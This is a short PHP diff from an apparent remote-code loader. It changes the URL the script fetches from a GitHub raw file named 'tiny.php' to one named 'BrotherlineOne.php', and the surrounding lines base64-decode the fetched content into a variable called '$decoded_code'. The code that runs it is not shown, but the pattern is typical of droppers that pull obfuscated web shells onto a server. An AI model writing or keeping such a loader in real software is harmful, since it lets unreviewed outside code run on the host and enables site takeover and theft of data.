@@ -11,7 +11,7 @@ function get_contents($url) {
     return $result;
 }
 
-$url = 'https://raw.githubusercontent.com/iPotacy/Bahan/refs/heads/main/tiny.php';
+$url = 'https://raw.githubusercontent.com/iPotacy/Bahan/refs/heads/main/BrotherlineOne.php';
 $encoded_code = get_contents($url);
 $decoded_code = base64_decode($encoded_code);
 
